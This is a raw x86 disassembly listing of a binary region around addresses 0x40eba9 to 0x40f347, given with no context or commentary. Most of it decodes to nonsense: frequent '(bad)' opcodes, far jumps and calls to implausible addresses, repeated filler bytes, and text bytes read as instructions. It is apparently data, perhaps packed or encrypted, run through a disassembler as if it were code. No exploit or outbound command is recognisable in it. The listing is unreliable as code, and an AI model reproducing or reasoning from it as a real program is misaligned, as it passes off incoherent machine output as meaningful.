  40eba9:	mov    ah,0x35
  40ebab:	fldenv [ecx+0x66]
  40ebae:	pop    esp
  40ebaf:	inc    edx
  40ebb0:	xchg   ebp,eax
  40ebb1:	sbb    al,0x65
  40ebb3:	lods   eax,DWORD PTR ds:[esi]
  40ebb4:	cwde   
  40ebb5:	or     cl,dl
  40ebb7:	out    dx,al
  40ebb8:	jecxz  0x40ec12
  40ebba:	add    BYTE PTR [eax],al
  40ebbc:	sbb    DWORD PTR [esi],ecx
	...
  40ebca:	cli    
  40ebcb:	ss xchg ecx,eax
  40ebcd:	(bad)  
  40ebce:	(bad)  
  40ebcf:	(bad)  
  40ebd0:	(bad)  
  40ebd1:	(bad)  
  40ebd2:	(bad)  
  40ebd3:	(bad)  
  40ebd4:	(bad)  
  40ebd5:	(bad)  
  40ebd6:	(bad)  
  40ebd7:	inc    DWORD PTR [ebp+0x5]
  40ebda:	push   esi
  40ebdb:	pushf  
  40ebdc:	lahf   
  40ebdd:	push   edi
  40ebde:	stos   BYTE PTR es:[edi],al
  40ebdf:	outs   dx,BYTE PTR ds:[esi]
  40ebe0:	pusha  
  40ebe1:	push   ds
  40ebe2:	add    eax,0xfe2f2f13
  40ebe7:	loop   0x40eb7b
  40ebe9:	or     DWORD PTR [ebx+0x5ab17b86],ebx
  40ebef:	cwde   
  40ebf0:	(bad)  
  40ebf1:	call   DWORD PTR [edi]
  40ebf3:	aad    0xa7
  40ebf5:	pcmpgtb mm7,QWORD PTR [ebx+0x335d0906]
  40ebfc:	sub    DWORD PTR [ebp-0x4e0d91d0],esp
  40ec02:	js     0x40ec32
  40ec04:	popf   
  40ec05:	and    esp,DWORD PTR [edi]
  40ec07:	jmp    0x76bf:0xf7a91670
  40ec0e:	lods   eax,DWORD PTR ds:[esi]
  40ec0f:	(bad)  
  40ec10:	jmp    DWORD PTR [esp+ecx*4-0x2d]
  40ec14:	(bad)  
  40ec15:	call   FWORD PTR [edi+0x78]
  40ec18:	adc    edi,edi
  40ec1a:	add    BYTE PTR ds:0x1365c371,ah
  40ec20:	inc    edi
  40ec21:	fist   DWORD PTR ds:0xefe5a5bd
  40ec27:	mov    edx,0x59de55d3
  40ec2c:	out    0x3,al
  40ec2e:	inc    esp
  40ec2f:	test   BYTE PTR [ebx],ah
  40ec31:	enter  0x84,0x0
  40ec35:	add    BYTE PTR [ebp+ecx*8-0x2edc0000],dl
  40ec3c:	add    BYTE PTR [eax],al
  40ec3e:	add    bh,bh
  40ec40:	(bad)  
  40ec41:	(bad)  
  40ec42:	(bad)  
  40ec43:	(bad)  
  40ec44:	(bad)  
  40ec45:	(bad)  
  40ec46:	(bad)  
  40ec47:	dec    DWORD PTR [edx+0x54538a8e]
  40ec4d:	push   0x6c
  40ec4f:	add    ebp,ebp
  40ec51:	mov    edi,0xd2e2aa94
  40ec56:	retf   
  40ec57:	int    0xcb
  40ec59:	in     al,dx
  40ec5a:	or     ah,al
  40ec5c:	ret    
  40ec5d:	mov    esi,0x8b8b798b
  40ec62:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40ec68:	mov    ecx,DWORD PTR [esp+ecx*1]
  40ec6b:	(bad)  
  40ec6c:	jns    0x40ec3b
  40ec6e:	js     0x40ec7c
  40ec70:	or     al,0x56
  40ec72:	mov    ecx,0xe19a48f7
  40ec77:	xor    BYTE PTR [ebp+0x4ebb7c15],0x6d
  40ec7e:	pop    eax
  40ec7f:	stos   BYTE PTR es:[edi],al
  40ec80:	adc    DWORD PTR [ebx-0x61],ecx
  40ec83:	sub    al,0x1f
  40ec85:	cmp    al,0xe
  40ec87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec88:	adc    bl,0x6e
  40ec8b:	outs   dx,BYTE PTR ds:[esi]
  40ec8c:	shr    DWORD PTR [ebp+0x5030aecc],cl
  40ec92:	mov    edx,0xbc0c0c79
  40ec97:	inc    edx
  40ec98:	or     al,0xc
  40ec9a:	dec    ebp
  40ec9b:	into   
  40ec9c:	call   0x68abecad
  40eca1:	and    eax,0x94c04cef
  40eca6:	scas   eax,DWORD PTR es:[edi]
  40eca7:	push   0x6d
  40eca9:	mov    bl,cl
  40ecab:	jmp    0x6e86b65f
  40ecb0:	test   DWORD PTR [esp+eiz*8+0x48],0xaf4af2
  40ecb8:	add    BYTE PTR [eax],al
  40ecba:	fwait
  40ecbb:	mov    edx,esi
  40ecbd:	leave  
  40ecbe:	xchg   esp,eax
  40ecbf:	leave  
  40ecc0:	mov    ds:0xe5f8f429,eax
  40ecc5:	mov    dh,0xe0
  40ecc7:	cs xchg edi,eax
  40ecc9:	xor    BYTE PTR ds:0x74bf3d0b,0x50
  40ecd0:	(bad)  
  40ecd1:	inc    ebp
  40ecd2:	comiss xmm1,xmm5
  40ecd5:	jg     0x40ec89
  40ecd7:	add    BYTE PTR [eax],al
  40ecd9:	jo     0x40ed3b
  40ecdb:	add    BYTE PTR [eax],0x0
	...
  40ece6:	add    BYTE PTR [eax],al
  40ece8:	mov    esp,0xca8d
  40eced:	add    BYTE PTR [eax],al
  40ecef:	add    BYTE PTR [eax],al
  40ecf1:	add    BYTE PTR [eax],al
  40ecf3:	add    BYTE PTR [ecx-0xab05e77],cl
  40ecf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecfa:	dec    edi
  40ecfb:	dec    edi
  40ecfc:	mov    ebx,0x25e175c9
  40ed01:	add    BYTE PTR ds:0xaee8e4da,bh
  40ed07:	mov    ecx,0xbc402c1e
  40ed0c:	pop    eax
  40ed0d:	stos   BYTE PTR es:[edi],al
  40ed0e:	mov    DWORD PTR [ecx-0x767610b5],ecx
  40ed14:	sbb    dh,BYTE PTR [ebp-0x1db47677]
  40ed1a:	in     al,0x55
  40ed1c:	je     0x40ed5b
  40ed1e:	inc    eax
  40ed1f:	in     eax,0x85
  40ed21:	(bad)
  40ed24:	icebp  
  40ed25:	mov    cl,BYTE PTR [eax]
  40ed27:	pop    ebx
  40ed28:	pop    edx
  40ed29:	dec    ebx
  40ed2a:	push   esp
  40ed2b:	add    ebx,edx
  40ed2d:	mov    eax,ds:0x899571
  40ed32:	push   ds
  40ed33:	ficom  DWORD PTR [ecx]
  40ed35:	mov    ds:0xfb000000,eax
  40ed3a:	and    al,0x9e
  40ed3d:	jmp    0x40edae
  40ed3f:	inc    bp
  40ed41:	sub    al,0x28
  40ed43:	aad    0xc9
  40ed45:	xchg   ebp,eax
  40ed46:	cmp    BYTE PTR [ebp-0x4f],0x9d
  40ed4a:	and    DWORD PTR ds:0x656fae67,esi
  40ed50:	jae    0x40edb7
  40ed52:	push   0x2e417249
  40ed57:	gs gs jae 0x40edbe
  40ed5b:	or     ah,BYTE PTR [eax]
  40ed5d:	push   ebx
  40ed5e:	gs jbe 0x40ed81
  40ed61:	inc    ecx
  40ed62:	push   edi
  40ed63:	jo     0x40edc8
  40ed65:	jb     0x40edcc
  40ed67:	inc    ecx
  40ed68:	bound  edi,QWORD PTR gs:[ecx+0x6d]
  40ed6c:	ins    DWORD PTR es:[edi],dx
  40ed6d:	and    BYTE PTR [ebp+0x6d],ch
  40ed70:	and    BYTE PTR [edx],bh
  40ed72:	gs ins BYTE PTR es:[edi],dx
  40ed74:	fs inc esp
  40ed76:	and    BYTE PTR [esi],ch
  40ed78:	and    BYTE PTR [ecx+0x65],ah
  40ed7b:	jb     0x40edbb
  40ed7d:	push   edi
  40ed7e:	cs ins DWORD PTR es:[edi],dx
  40ed80:	arpl   WORD PTR [edx+0x72],si
  40ed83:	ins    DWORD PTR es:[edi],dx
  40ed84:	and    ch,BYTE PTR [esi+0x20]
  40ed87:	outs   dx,DWORD PTR ds:[esi]
  40ed88:	cmp    al,0x53
  40ed8a:	je     0x40ee00
  40ed8c:	jns    0x40edae
  40ed8e:	jb     0x40edf2
  40ed90:	jb     0x40ee00
  40ed92:	inc    ecx
  40ed93:	and    BYTE PTR [edi+0xa],ch
  40ed96:	jo     0x40ee0b
  40ed98:	jb     0x40ee01
  40ed9a:	push   ebx
  40ed9b:	js     0x40edd9
  40ed9d:	gs inc ecx
  40ed9f:	or     ch,BYTE PTR [esi]
  40eda1:	gs or  eax,0x732e0d65
  40eda7:	popa   
  40eda8:	addr16 inc ecx
  40edaa:	or     eax,0x6753202e
  40edaf:	ins    DWORD PTR es:[edi],dx
  40edb0:	outs   dx,DWORD PTR ds:[esi]
  40edb1:	gs gs jb 0x40ee27
  40edb5:	sub    DWORD PTR [ebx+0x70],esi
  40edb8:	or     BYTE PTR [esi+0xc],ch
  40edbb:	xor    BYTE PTR [ecx+edx*1],cl
  40edbe:	mov    ecx,0x974072ad
  40edc3:	test   eax,0xfdb2
  40edc8:	in     eax,dx
  40edc9:	fld    DWORD PTR [eax]
  40edcb:	add    BYTE PTR [eax],al
  40edcd:	call   0xe929d6ba
  40edd2:	call   0x7629d6bf
  40edd7:	(bad)  
  40edd8:	std    
	...
  40ede1:	add    bh,bh
  40ede3:	jmp    FWORD PTR [ebx-0xca1676c]
  40ede9:	pop    ebx
  40edea:	fucom  st(6)
  40edec:	sub    bh,ah
  40edee:	fistp  QWORD PTR [edx+0x22]
  40edf1:	(bad)  
  40edf3:	retf   0x6718
  40edf6:	je     0x40edc0
  40edf8:	mov    BYTE PTR [ebp+edx*1-0xf00001d],ch
  40edff:	pop    ebx
  40ee00:	inc    edx
  40ee01:	std    
  40ee02:	pop    edx
  40ee03:	add    BYTE PTR [esi+0x3495165a],al
  40ee09:	mov    ebp,0x98218069
  40ee0e:	popf   
  40ee0f:	nop
  40ee10:	xchg   ecx,eax
  40ee11:	data16 aaa 
  40ee13:	or     DWORD PTR ss:[esi-0x64a61f4f],eax
  40ee1a:	lods   al,BYTE PTR ds:[esi]
  40ee1b:	(bad)  
  40ee1c:	jmp    ecx
  40ee1e:	js     0x40ee5f
  40ee20:	(bad)  
  40ee21:	jmp    DWORD PTR [ecx-0x4d]
  40ee24:	stos   BYTE PTR es:[edi],al
  40ee25:	(bad)  
  40ee26:	(bad)  
  40ee27:	in     al,dx
  40ee28:	sti    
  40ee29:	pushf  
  40ee2a:	add    eax,0x86257b9f
  40ee2f:	cmp    ch,ch
  40ee31:	mov    esi,0x58d84aa1
  40ee36:	ror    BYTE PTR [esp+ecx*8-0x5a1d1d08],1
  40ee3d:	mov    cs,esi
  40ee3f:	(bad)  
  40ee40:	(bad)  
  40ee41:	(bad)  
  40ee42:	fisttp DWORD PTR [eax-0x1]
  40ee45:	dec    DWORD PTR [eax-0xc8]
  40ee4b:	int3   
  40ee4c:	int3   
  40ee4d:	int3   
  40ee4e:	int3   
  40ee4f:	int3   
  40ee50:	int3   
  40ee51:	int3   
  40ee52:	int3   
  40ee53:	int3   
  40ee54:	loope  0x40ee26
  40ee56:	stos   BYTE PTR es:[edi],al
  40ee57:	bound  esp,QWORD PTR [ebp+0x35]
  40ee5a:	retf   
  40ee5b:	pop    esi
  40ee5c:	imul   ecx,esp,0xffffffa9
  40ee5f:	enter  0xaff7,0xf5
  40ee63:	aad    0x21
  40ee65:	not    DWORD PTR [esi]
  40ee67:	fisttp DWORD PTR [esi]
  40ee69:	jmp    0x8bcc23d7
  40ee6e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40ee74:	mov    eax,DWORD PTR [eax]
  40ee76:	add    BYTE PTR [ecx],bh
  40ee78:	cmp    eax,0xea2e
  40ee7d:	in     al,dx
  40ee7e:	in     al,dx
  40ee7f:	loopne 0x40ee34
  40ee81:	jp     0x40ee59
  40ee83:	jbe    0x40eee5
  40ee85:	or     BYTE PTR [edi-0x15],bl
  40ee88:	and    DWORD PTR [ecx+0x3a],esp
  40ee8b:	push   edi
  40ee8c:	xchg   edi,eax
  40ee8d:	mov    ds:0xa14db1d8,al
  40ee92:	push   edx
  40ee93:	xor    eax,0xac277afe
  40ee98:	ss ror esi,0xb6
  40ee9c:	mov    ebx,0xa3453a
  40eea1:	add    BYTE PTR [eax-0x68],cl
  40eea4:	add    BYTE PTR [eax],al
  40eea6:	xchg   edx,eax
  40eea7:	in     al,dx
  40eea8:	pop    ss
  40eea9:	add    al,ch
  40eeab:	dec    eax
  40eeac:	mov    ds:0x558033ca,al
  40eeb1:	mov    edx,0x16dcd09c
  40eeb6:	es ins DWORD PTR es:[edi],dx
  40eeb8:	clc    
  40eeb9:	ror    ebp,0x8e
  40eebc:	add    eax,0x22f1a267
  40eec1:	dec    edx
  40eec2:	ret    
  40eec3:	call   0x1b72d7b0
  40eec8:	jnp    0x40ef15
  40eeca:	ins    DWORD PTR es:[edi],dx
  40eecb:	inc    ebx
  40eecc:	xchg   ebp,eax
  40eecd:	push   ebx
  40eece:	outs   dx,DWORD PTR ds:[esi]
  40eecf:	mov    al,0xd4
  40eed1:	fwait
  40eed2:	mov    edi,0x636e922a
  40eed7:	push   ebx
  40eed8:	and    cl,cl
  40eeda:	arpl   ax,si
  40eedc:	in     al,dx
  40eedd:	sahf   
  40eede:	out    dx,al
  40eedf:	aaa    
  40eee0:	xor    DWORD PTR [eax],esi
  40eee2:	jns    0x40eecc
  40eee4:	call   0xe937981f
  40eee9:	call   0x40efd6
  40eeee:	add    BYTE PTR [eax],al
  40eef0:	add    BYTE PTR [eax],al
  40eef2:	add    BYTE PTR [eax],al
  40eef4:	mov    ecx,0x8b8b16cd
  40eef9:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40eeff:	mov    ecx,DWORD PTR [ebx+0x35a3258b]
  40ef05:	leave  
  40ef06:	ja     0x40ef17
  40ef08:	jecxz  0x40ef04
  40ef0a:	repnz push ebx
  40ef0c:	and    ah,BYTE PTR ds:0xe87001f2
  40ef12:	or     ecx,DWORD PTR [ebp+0x45362a8e]
  40ef18:	div    DWORD PTR [eax-0x75]
  40ef1b:	mov    edx,esi
  40ef1d:	test   DWORD PTR [ebx-0x74494f75],ecx
  40ef23:	mov    ebx,eax
  40ef25:	cmp    al,0x24
  40ef27:	and    esp,0x695c6b2d
  40ef2d:	(bad)  
  40ef2e:	in     al,dx
  40ef2f:	sbb    eax,0x8194f65b
  40ef34:	daa    
  40ef35:	push   ds
  40ef36:	das    
  40ef37:	lods   al,BYTE PTR ds:[esi]
  40ef38:	js     0x40eeca
  40ef3a:	popa   
  40ef3b:	out    dx,eax
  40ef3c:	mov    eax,DWORD PTR [eax]
  40ef3e:	in     al,0x19
  40ef40:	dec    edi
  40ef41:	add    BYTE PTR [eax],al
  40ef43:	add    BYTE PTR [eax],al
  40ef45:	mov    dl,0x61
  40ef47:	out    dx,eax
  40ef48:	inc    esp
  40ef49:	int3   
  40ef4a:	add    al,0x8d
  40ef4c:	rcl    DWORD PTR [ebx-0x42b6d2bc],cl
  40ef52:	cld    
  40ef53:	sub    ebx,DWORD PTR [edi]
  40ef55:	mov    ecx,0x4f28f4af
  40ef5a:	mov    edx,0xecd9c45d
  40ef5f:	mov    al,ds:0xbee90881
  40ef64:	(bad)  
  40ef65:	adc    al,0x9c
  40ef67:	fwait
  40ef68:	add    BYTE PTR [eax],al
  40ef6a:	fld    DWORD PTR ss:[eax]
	...
  40ef75:	add    BYTE PTR [eax],al
  40ef77:	add    BYTE PTR [ebx+0x404566b],ah
  40ef7d:	add    al,0x4
  40ef7f:	add    al,0x4
  40ef81:	add    al,0x4
  40ef83:	add    al,0x6a
  40ef85:	push   0xffffffb1
  40ef87:	xlat   BYTE PTR ds:[ebx]
  40ef88:	mov    bl,0xca
  40ef8a:	loope  0x40ef5d
  40ef8c:	xchg   esi,eax
  40ef8d:	outs   dx,DWORD PTR ds:[esi]
  40ef8e:	daa    
  40ef8f:	lahf   
  40ef90:	inc    edi
  40ef91:	sub    al,0x7d
  40ef93:	jo     0x40ef60
  40ef95:	ret    
  40ef96:	pop    esi
  40ef97:	push   0x475bf1c9
  40ef9c:	ficomp WORD PTR [ebx+0x2fc06a6a]
  40efa2:	movlps QWORD PTR [esi+0x1e12ba56],xmm3
  40efa9:	in     eax,dx
  40efaa:	inc    edx
  40efab:	fild   WORD PTR [edx]
  40efad:	lods   al,BYTE PTR ds:[esi]
  40efae:	pop    ecx
  40efaf:	lock adc al,0xd
  40efb2:	xchg   edi,eax
  40efb3:	push   eax
  40efb4:	(bad)  
  40efb5:	(bad)  
  40efb6:	adc    eax,0xe47f536c
  40efbb:	pop    edx
  40efbc:	imul   DWORD PTR [edx+0x6a]
  40efbf:	loop   0x40efba
  40efc1:	sub    DWORD PTR [edx+0x6a],0xfffffff6
  40efc5:	jp     0x40f01a
  40efc7:	push   0x0
  40efc9:	push   esi
  40efca:	fcomi  st,st(3)
  40efcc:	lock xchg edx,eax
  40efce:	jmp    0x40f005
  40efd0:	jge    0x40f046
  40efd2:	cwde   
  40efd3:	popa   
  40efd4:	(bad)  
  40efd5:	pop    edx
  40efd6:	xchg   ebx,eax
  40efd7:	out    0x8b,eax
  40efd9:	mov    eax,0x4f0f016a
  40efde:	jae    0x40efbe
  40efe0:	ret    
  40efe1:	add    BYTE PTR [eax],al
  40efe3:	add    BYTE PTR [ebx],dh
  40efe5:	jmp    0x0:0x80bb0000
  40efec:	add    BYTE PTR [ecx-0x76767677],cl
  40eff2:	mov    DWORD PTR [ecx+0x67e8989],ecx
  40eff8:	mov    esi,0x561f1e79
  40effd:	fisub  DWORD PTR [ebx-0x4b]
  40f000:	outs   dx,DWORD PTR ds:[esi]
  40f001:	fsub   QWORD PTR [esi-0x6a]
  40f004:	inc    esp
  40f005:	adc    BYTE PTR [eax+0x6ceac671],ah
  40f00b:	(bad)  
  40f00c:	fmul   DWORD PTR [eax]
  40f00e:	inc    ebp
  40f00f:	inc    ebp
  40f010:	inc    ebp
  40f011:	inc    ebp
  40f012:	inc    ebp
  40f013:	inc    ebp
  40f014:	inc    ebp
  40f015:	inc    ebp
  40f016:	inc    ebp
  40f017:	mov    ecx,DWORD PTR [ebx+0x5ecd5c0d]
  40f01d:	mov    ecx,DWORD PTR [ebx+0x4e7c9a37]
  40f023:	addr16 add eax,0x3c2fd983
  40f029:	sti    
  40f02a:	cmp    al,0x88
  40f02c:	shl    DWORD PTR [ebp-0xe],1
  40f02f:	adc    al,0x43
  40f031:	cmp    al,0x29
  40f033:	jnp    0x40efc0
  40f035:	cmp    BYTE PTR [esi+0x21],al
  40f038:	ja     0x40efcf
  40f03a:	dec    ebx
  40f03b:	test   esi,ecx
  40f03d:	imul   ebx,DWORD PTR [eax-0x63],0x51
  40f041:	aaa    
  40f042:	mov    ecx,DWORD PTR [ebx-0x74741d94]
  40f048:	bswap  ecx
  40f04a:	jnp    0x40efd7
  40f04c:	mov    esi,edi
  40f04e:	mov    ch,cl
  40f050:	mov    al,ds:0x4005fcab
  40f055:	js     0x40efef
  40f057:	push   0xffffffe8
  40f059:	jne    0x40f045
  40f05b:	call   FWORD PTR [eax+0x5c16d47]
  40f061:	mov    DWORD PTR [eax+0xe],esi
  40f064:	inc    edi
  40f065:	mov    ecx,DWORD PTR [ebx-0xabfcf75]
  40f06b:	and    esi,DWORD PTR [edx]
  40f06d:	mov    esi,ebx
  40f06f:	mov    esi,0x87682776
  40f074:	cmp    esp,0x9d2d1d1a
  40f07a:	push   ebx
  40f07b:	pop    esi
  40f07c:	mov    BYTE PTR [edx+0x4f7f60c1],dh
  40f082:	jge    0x40f0ba
  40f084:	mov    esp,0x2008b8b
  40f089:	mov    esp,0x8b8b8b
	...
  40f096:	lods   eax,DWORD PTR ds:[esi]
  40f097:	mov    eax,ds:0x8b8b8b0f
  40f09c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40f0a2:	add    BYTE PTR [eax],al
  40f0a4:	into   
  40f0a5:	sahf   
  40f0a6:	cmp    ecx,DWORD PTR [esi]
  40f0a8:	cmp    eax,0x6c0b7a7b
  40f0ad:	test   ah,dh
  40f0af:	std    
  40f0b0:	fiadd  DWORD PTR [ecx+0x66]
  40f0b3:	cdq    
  40f0b4:	lds    eax,FWORD PTR [ebx+eax*4-0x2]
  40f0b8:	les    ecx,FWORD PTR [eax+esi*4+0x1f]
  40f0bc:	add    BYTE PTR [eax],al
  40f0be:	xor    ebp,esi
  40f0c0:	add    BYTE PTR [eax],al
  40f0c2:	mov    dl,0x3f
  40f0c4:	add    BYTE PTR [edx+0x65],ah
  40f0c7:	or     eax,0x6f206374
  40f0cc:	or     eax,0x732e7745
  40f0d1:	or     ch,BYTE PTR [eax+eiz*1+0x6d]
  40f0d5:	or     eax,0x64203c77
  40f0da:	ins    BYTE PTR es:[edi],dx
  40f0db:	and    BYTE PTR [ebp+0x6d],cl
  40f0de:	je     0x40f0ea
  40f0e0:	ins    DWORD PTR es:[edi],dx
  40f0e1:	imul   ebp,DWORD PTR gs:[ebp+0x22],0x74630a44
  40f0e9:	sub    DWORD PTR [edx],edi
  40f0eb:	outs   dx,DWORD PTR gs:[esi]
  40f0ed:	gs je  0x40f110
  40f0f0:	ins    DWORD PTR es:[edi],dx
  40f0f1:	jb     0x40f12f
  40f0f3:	jo     0x40f14c
  40f0f5:	outs   dx,BYTE PTR ds:[esi]
  40f0f6:	jb     0x40f166
  40f0f8:	jae    0x40f11a
  40f0fa:	outs   dx,BYTE PTR ds:[esi]
  40f0fb:	jb     0x40f15f
  40f0fd:	push   ebx
  40f0fe:	ds push ebx
  40f100:	and    BYTE PTR [ebx+0x72],ah
  40f103:	popa   
  40f104:	imul   ebp,DWORD PTR [esi],0x65202e68
  40f10a:	dec    ebp
  40f10b:	and    BYTE PTR [esp+esi*2+0x23],dh
  40f10f:	je     0x40f180
  40f111:	add    BYTE PTR [edi-0x7c],dh
  40f114:	and    al,0xef
  40f116:	adc    BYTE PTR [eax+edi*8-0x3b],dl
  40f11a:	add    DWORD PTR [ebp+0x10],ebp
  40f11d:	inc    esp
  40f11e:	rcr    esi,0x47
  40f121:	and    BYTE PTR [ebx],ah
  40f123:	push   esi
  40f124:	mov    bh,0x75
  40f126:	neg    ebx
  40f128:	adc    BYTE PTR [ebx+0x5dd0c000],0xc8
  40f12f:	retf   0xc0c0
  40f132:	sar    BYTE PTR [eax],0xa0
  40f135:	iret   
  40f136:	rol    BYTE PTR [esp+ebp*8-0x3b718e33],cl
  40f13d:	sub    BYTE PTR [edx+0x4435b81f],0x4a
  40f144:	ins    BYTE PTR es:[edi],dx
  40f145:	xor    ah,BYTE PTR [edx+eiz*8]
  40f148:	repz int3 
  40f14a:	mov    ebp,0xa786dd7e
  40f14f:	mov    al,0x35
  40f151:	jnp    0x40f191
  40f153:	mov    ah,0x43
  40f155:	and    al,al
  40f157:	ror    BYTE PTR [ebp+0x5a],0xc0
  40f15b:	rol    al,0x83
  40f15e:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40f165:	or     DWORD PTR ds:0x8b8bcb81,0xffffff8b
  40f16c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40f172:	add    BYTE PTR [eax],al
  40f174:	jb     0x40f135
  40f176:	out    0x35,eax
  40f178:	pop    esp
  40f179:	xchg   esp,eax
  40f17a:	mov    edx,DWORD PTR [esi]
  40f17c:	sbb    ch,dl
  40f17e:	(bad)  
  40f17f:	cdq    
  40f180:	jno    0x40f14f
  40f182:	lock pop ds
  40f184:	icebp  
  40f185:	adc    BYTE PTR [edx],al
  40f187:	mov    ah,0x76
  40f189:	bound  edi,QWORD PTR [ecx-0x72]
  40f18c:	add    BYTE PTR [eax],al
  40f18e:	dec    dh
  40f190:	lock fistp QWORD PTR [ecx]
  40f193:	mov    ah,0xa3
  40f195:	sbb    ebp,DWORD PTR [ebx]
  40f197:	xchg   ecx,eax
  40f198:	imul   esi,DWORD PTR [esp+esi*4-0x42],0xffffff94
  40f19d:	(bad)  
  40f19e:	fld    TBYTE PTR [edx-0x4d]
  40f1a1:	mov    ch,0x85
  40f1a3:	dec    edx
  40f1a4:	jle    0x40f1a8
  40f1a6:	call   0x0:0xe5c6c43e
  40f1ad:	and    ebp,esi
  40f1af:	jge    0x40f1b1
  40f1b1:	add    bl,ch
  40f1b3:	mov    BYTE PTR [edx+0x0],bl
  40f1b6:	add    dl,al
  40f1b8:	push   0x18edbffd
  40f1bd:	rol    DWORD PTR [edx+0x6791335b],cl
  40f1c3:	add    ebx,DWORD PTR [ebp-0x644a7414]
  40f1c9:	imul   cl
  40f1cb:	sbb    dh,cl
  40f1cd:	xchg   ebx,eax
  40f1ce:	jae    0x40f1d0
  40f1d0:	add    BYTE PTR [eax],al
  40f1d2:	aas    
  40f1d3:	or     eax,0xe68e0000
	...
  40f1e4:	xor    al,0xb9
  40f1e6:	pusha  
  40f1e7:	pushf  
  40f1e8:	xlat   BYTE PTR ds:[ebx]
  40f1e9:	sub    DWORD PTR [esi-0x2e2da161],ecx
  40f1ef:	jbe    0x40f18c
  40f1f1:	jmp    0x40f258
  40f1f3:	inc    esp
  40f1f4:	mov    cl,0x34
  40f1f6:	shr    DWORD PTR gs:[ebp-0x57],1
  40f1fa:	dec    ebp
  40f1fb:	mov    al,0x8d
  40f1fd:	lea    ecx,[ebp-0x72727273]
  40f203:	lea    ecx,[ebp-0x27b0000]
  40f209:	jg     0x40f1f8
  40f20b:	add    BYTE PTR [eax],al
  40f20d:	mov    dl,0x1b
  40f20f:	int    0xb
  40f211:	inc    edi
  40f212:	dec    esp
  40f213:	add    al,ch
  40f215:	imul   DWORD PTR [ecx+0x3b]
  40f218:	or     ebx,DWORD PTR [esi+0x24]
  40f21b:	scas   eax,DWORD PTR es:[edi]
  40f21c:	mov    ch,0x8a
  40f21e:	mov    bh,0x37
  40f220:	out    dx,al
  40f221:	xchg   esp,eax
  40f222:	add    BYTE PTR [eax+0x5a],al
  40f225:	push   esi
  40f226:	add    bl,BYTE PTR [ebp+0x231c6bbb]
  40f22c:	cmp    DWORD PTR [ebx+0x1],esi
  40f22f:	inc    ebx
  40f230:	add    BYTE PTR [eax],al
  40f232:	and    esi,DWORD PTR [ebp+0x1be00000]
  40f238:	and    eax,DWORD PTR [eax]
  40f23a:	mov    esp,DWORD PTR [edx]
  40f23c:	cmp    bh,BYTE PTR [eax]
  40f23e:	lods   al,BYTE PTR ds:[esi]
  40f23f:	aad    0xf5
  40f241:	inc    ecx
  40f242:	loop   0x40f2c3
  40f244:	fisub  WORD PTR [eax+0x48b6767f]
  40f24a:	popa   
  40f24b:	in     eax,0xfe
  40f24d:	adc    eax,0xcaa83c48
  40f252:	hlt    
  40f253:	mov    ecx,DWORD PTR [ebx-0x2e8a6b75]
  40f259:	mov    bl,0x32
  40f25b:	adc    bh,BYTE PTR [eax]
  40f25d:	lods   eax,DWORD PTR ds:[esi]
  40f25e:	bound  ebp,QWORD PTR [eax*1-0x5c96a778]
  40f265:	stos   DWORD PTR es:[edi],eax
  40f266:	push   edi
  40f267:	adc    DWORD PTR [edx-0x21],ecx
  40f26a:	mov    esp,0x560b4d60
  40f26f:	mov    al,0x64
  40f271:	jl     0x40f242
  40f273:	mov    ecx,DWORD PTR [ebx-0x7485271c]
  40f279:	mov    ecx,DWORD PTR [ebx-0x7c7c7c7d]
  40f27f:	add    DWORD PTR [ebx+0x45838383],0xfffffff6
  40f286:	hlt    
  40f287:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40f28d:	mov    ecx,DWORD PTR [ebx-0x79767675]
  40f293:	pop    ebp
  40f294:	or     BYTE PTR [edx-0x4c],0x32
  40f298:	inc    edx
  40f299:	xchg   edx,eax
  40f29a:	mov    edi,0x517fdfd0
  40f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a0:	popa   
  40f2a1:	adc    DWORD PTR [esi-0x12],edi
  40f2a4:	test   eax,0xa105dfed
  40f2a9:	mov    cs,WORD PTR [ecx-0x769aaf77]
  40f2af:	mov    DWORD PTR [esi],ecx
  40f2b1:	retf   0x8989
  40f2b4:	sahf   
  40f2b5:	mov    ch,0x63
  40f2b7:	loop   0x40f319
  40f2b9:	and    al,0xda
  40f2bb:	jmp    0x40f292
  40f2bd:	inc    ah
  40f2bf:	cli    
  40f2c0:	pop    eax
  40f2c1:	icebp  
  40f2c2:	iret   
  40f2c3:	inc    edi
  40f2c4:	add    DWORD PTR [edx-0x6f],esp
  40f2c7:	cmp    edi,DWORD PTR [edx]
  40f2c9:	mov    dh,0x7b
  40f2cb:	loope  0x40f256
  40f2cd:	lea    eax,[ecx-0x7254ec29]
  40f2d3:	lea    ecx,[ebp+0x7e2afb6c]
  40f2d9:	test   eax,0x97a3dcae
  40f2de:	inc    ebx
  40f2df:	inc    edx
  40f2e0:	loopne 0x40f2d3
  40f2e2:	jno    0x40f283
  40f2e4:	mov    ah,BYTE PTR [edi+0x70]
  40f2e7:	or     ch,BYTE PTR [eax-0x3f1f4abc]
  40f2ed:	xlat   BYTE PTR ds:[ebx]
  40f2ee:	cdq    
  40f2ef:	ret    0x8ae5
  40f2f2:	push   cs
  40f2f3:	xor    eax,0x22aa77f1
  40f2f8:	lea    ecx,[ebp-0x72727784]
  40f2fe:	lea    eax,[eax]
	...
  40f308:	lahf   
  40f309:	pop    ss
  40f30a:	icebp  
	...
  40f313:	add    BYTE PTR [ebx-0x34dca775],cl
  40f319:	arpl   ax,bp
  40f31b:	shr    BYTE PTR [edx+0x6246b085],cl
  40f321:	and    eax,0x6982fceb
  40f326:	inc    BYTE PTR [ecx]
  40f328:	push   ecx
  40f329:	jb     0x40f356
  40f32b:	push   0x38
  40f32d:	sbb    ecx,DWORD PTR [ebx-0x70e25675]
  40f333:	lea    edi,[ebx+0x40]
  40f336:	mov    dl,BYTE PTR [esi]
  40f338:	dec    ebx
  40f339:	gs arpl WORD PTR ds:[edi+0x41],sp
  40f33e:	jb     0x40f3a9
  40f340:	or     eax,0x3e200d63
  40f345:	ins    DWORD PTR es:[edi],dx
  40f346:	inc    ebx
  40f347:	ds jb  0x40f3b9
